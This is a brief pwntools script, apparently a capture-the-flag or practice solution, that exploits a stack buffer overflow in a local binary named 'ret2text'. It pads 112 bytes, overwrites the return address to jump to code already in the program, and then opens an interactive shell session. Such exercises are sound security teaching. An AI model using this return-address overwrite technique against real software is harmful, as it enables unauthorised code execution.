from pwn import *
sh = process('./ret2text')

payload = b'a'*112 + p32(0x804863A)
sh.sendline(payload)
sh.interactive()